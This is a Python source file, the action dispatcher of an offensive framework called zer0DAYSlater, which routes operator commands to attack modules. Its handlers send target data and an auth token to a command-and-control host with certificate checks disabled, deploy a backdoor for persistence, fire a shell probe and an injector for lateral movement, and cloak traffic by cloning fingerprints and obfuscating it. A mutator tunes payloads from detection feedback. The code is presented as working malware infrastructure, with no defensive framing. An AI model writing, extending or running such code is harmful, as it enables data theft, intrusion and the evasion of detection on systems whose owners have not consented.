#!/usr/bin/env python3
"""
zer0DAYSlater — Action Dispatcher
Bridges the operator pipeline to execution modules.
"""
from __future__ import annotations
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from pathlib import Path
from typing import Any

ZDS_ROOT = Path(__file__).parent
OWN_ROOT = ZDS_ROOT.parent / "OWN" / "OWN_PACKAGE" / "phases"
sys.path.insert(0, str(ZDS_ROOT))
sys.path.insert(0, str(OWN_ROOT))

from payload_mutator import PayloadMutator, ChannelFeedback
from entropy_capsule import EntropyCapsuleEngine
from session_drift_monitor import SessionDriftMonitor

def _handle_exfil(action_obj, mutation, c2_ip, c2_port):
    import requests, uuid, os
    targets = action_obj.get("targets", [])
    agent_id = os.environ.get("ZDS_AGENT_ID", str(uuid.uuid4())[:8])
    token = os.environ.get("ZDS_AUTH_TOKEN", "")
    endpoint = os.environ.get("ZDS_HTTPS_ENDPOINT", f"https://{c2_ip}:{c2_port}")
    url = f"{endpoint}/data/{agent_id}"
    payload = {
        "targets": targets,
        "payload_hash": mutation.payload_hash,
        "personality": mutation.personality.value,
        "noise": action_obj.get("noise"),
        "schedule": action_obj.get("schedule"),
        "token": token,
    }
    try:
        resp = requests.post(url, json=payload, verify=False, timeout=5)
        if resp.status_code == 200:
            return {"success": True, "detected": False, "channel": "HTTPS", "latency_ms": 120.0}
        else:
            return {"success": False, "detected": False, "channel": "HTTPS", "latency_ms": 0.0, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"success": False, "detected": False, "channel": "HTTPS", "latency_ms": 0.0, "error": str(e)}

def _handle_persist(action_obj, mutation):
    try:
        import backdoor_seed
        backdoor_seed.deploy_backdoor()
        return {"success": True, "detected": False, "channel": "local", "latency_ms": 50.0}
    except Exception as e:
        return {"success": False, "detected": False, "channel": "local", "latency_ms": 0.0, "error": str(e)}

def _handle_lateral(action_obj, mutation):
    targets = action_obj.get("targets", [])
    try:
        import ghost_probe
        import chimera_injector
        ghost_probe.probe_shell()
        chimera_injector.fire()
        return {"success": True, "detected": False, "channel": "TCP", "latency_ms": 200.0}
    except Exception as e:
        return {"success": False, "detected": False, "channel": "TCP", "latency_ms": 0.0, "error": str(e)}

def _handle_recon(action_obj, mutation):
    targets = action_obj.get("targets", [])
    try:
        import adaptive_probe
        for target in targets:
            adaptive_probe.probe_host(target)
        return {"success": True, "detected": False, "channel": "TCP", "latency_ms": 150.0}
    except Exception as e:
        return {"success": False, "detected": False, "channel": "TCP", "latency_ms": 0.0, "error": str(e)}

def _handle_cloak(action_obj, mutation):
    try:
        import obfuscator_engine
        import fingerprint_cloner
        fingerprint_cloner.mimic('127.0.0.1', 80)
        obfuscator_engine.obfuscate_http(mutation.payload_hash)
        return {"success": True, "detected": False, "channel": "local", "latency_ms": 30.0}
    except Exception as e:
        return {"success": False, "detected": False, "channel": "local", "latency_ms": 0.0, "error": str(e)}

_HANDLERS = {
    "exfil":   _handle_exfil,
    "persist": _handle_persist,
    "lateral": _handle_lateral,
    "recon":   _handle_recon,
    "cloak":   _handle_cloak,
}

class Dispatcher:
    def __init__(self, c2_ip="127.0.0.1", c2_port=8080):
        self.mutator  = PayloadMutator()
        self.entropy  = EntropyCapsuleEngine()
        self.drift    = SessionDriftMonitor()
        self.c2_ip    = c2_ip
        self.c2_port  = c2_port

    def dispatch(self, action_obj):
        action = action_obj.get("action", "unknown")
        print(f"\n[dispatcher] action={action} noise={action_obj.get('noise')} targets={action_obj.get('targets')}")

        drift_result  = self.drift.ingest(action_obj)
        drift_score   = self.drift.drift_score
        drift_status  = 'HALT' if drift_result['halt'] else 'WARN' if drift_result['warn'] else 'NOMINAL'

        if drift_status == "HALT":
            print(f"[HALT] Drift blocked — drift={drift_score:.3f}")
            return {"halted": True, "reason": "drift", "drift_score": drift_score}
        if drift_status == "WARN":
            print(f"[WARN] Drift elevated — drift={drift_score:.3f}")

        entropy_result = self.entropy.ingest(action_obj, action_obj.get("_raw_cmd", ""))
        entropy_score  = self.entropy.current_entropy()
        entropy_status = self.entropy.report()['status']

        if entropy_status == "CRITICAL":
            print(f"[HALT] Entropy blocked — entropy={entropy_score:.3f}")
            return {"halted": True, "reason": "entropy", "entropy_score": entropy_score}

        mutation = self.mutator.mutate(action_obj=action_obj, entropy_score=entropy_score, drift_score=drift_score)
        print(f"[mutator] personality={mutation.personality.value} ops={[op.value for op in mutation.mutation_ops]} fitness={mutation.fitness_score:.2f} hash={mutation.payload_hash}")

        handler = _HANDLERS.get(action)
        if not handler:
            print(f"[!] No handler for action: {action}")
            return {"halted": False, "error": f"unknown action: {action}"}

        t0 = time.time()
        if action == "exfil":
            result = handler(action_obj, mutation, self.c2_ip, self.c2_port)
        else:
            result = handler(action_obj, mutation)
        result["latency_ms"] = round((time.time() - t0) * 1000, 1)

        self.mutator.feedback(ChannelFeedback(
            payload_hash = mutation.payload_hash,
            success      = result.get("success", False),
            detected     = result.get("detected", False),
            channel      = result.get("channel", "unknown"),
            latency_ms   = result.get("latency_ms", 0.0),
            error        = result.get("error"),
        ))

        status = "[+]" if result.get("success") else "[!]"
        print(f"{status} {action} via {result.get('channel')} latency={result.get('latency_ms')}ms")
        if result.get("error"):
            print(f"    error: {result['error']}")
        return result

    def fitness_report(self):
        print("\n── Fitness report ──")
        for p, f in self.mutator.fitness_report().items():
            bar = "█" * int(f * 20)
            print(f"  {p:<12} {f:.2f} {bar}")

if __name__ == "__main__":
    import json
    print("[dispatcher] test mode — paste action object JSON or type quit")
    d = Dispatcher()
    while True:
        try:
            raw = input("\naction_obj> ").strip()
        except (KeyboardInterrupt, EOFError):
            break
        if raw.lower() in ("quit", "q", "exit"):
            break
        try:
            d.dispatch(json.loads(raw))
        except json.JSONDecodeError as e:
            print(f"[!] Invalid JSON: {e}")
    d.fitness_report()
